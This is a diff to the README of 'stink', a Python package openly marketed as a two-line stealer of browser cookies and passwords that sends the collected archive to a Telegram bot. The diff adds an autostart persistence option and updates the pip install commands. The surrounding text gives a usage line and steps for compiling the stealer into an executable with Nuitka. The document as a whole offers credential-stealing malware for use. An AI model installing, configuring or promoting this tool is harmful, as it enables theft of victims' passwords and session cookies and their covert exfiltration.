@@ -45,6 +45,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
    - Active processes
 3. Sending an archive of collected data to Telegram.
 4. Execution in a separate thread.
+5. Possibility to add to autostart.
 
 ### Future features
 1. Support for other browsers.
@@ -54,7 +55,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
 
 You can install the latest version with the command:
 ```
-pip install stink==1.0.3
+pip install stink==1.1.0
 ```
 
 ## Example usage
@@ -67,6 +68,8 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ### Additional parameters
 
 - `errors` - error output.
+
+- `autostart` - adding to autostart.
 
 - `passwords` - collecting passwords.
 
@@ -86,7 +89,7 @@ All parameters take the value of `bool`.
 
 - `False` - the function is disabled.
 
-All functions are enabled by default, except for error output.
+All functions are enabled by default, except for error output and adding to autostart.
 
 ## Telegram bot setup
 ### Getting token
@@ -158,7 +161,7 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==1.0.3
+pip install stink==1.1.0
 ```
 6. Write the command:
 ```
